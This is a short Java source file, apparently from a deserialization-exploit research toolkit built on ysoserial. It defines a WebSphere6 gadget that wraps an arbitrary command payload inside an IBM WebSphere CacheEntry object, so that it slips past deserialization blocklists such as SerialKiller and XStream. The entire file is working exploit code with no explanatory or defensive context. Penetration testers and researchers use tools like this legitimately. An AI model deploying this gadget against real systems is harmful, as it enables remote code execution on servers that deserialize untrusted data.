package serialkiller.bypass;

import com.ibm.ws.wssecurity.handler.token.CacheEntry;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "websphere"} )
public class WebSphere6 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);
        CacheEntry cacheEntry = new CacheEntry();
        Reflections.setFieldValue(cacheEntry, "_id", payload);
        Reflections.setFieldValue(cacheEntry, "_value", payload);

        return cacheEntry;

    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}
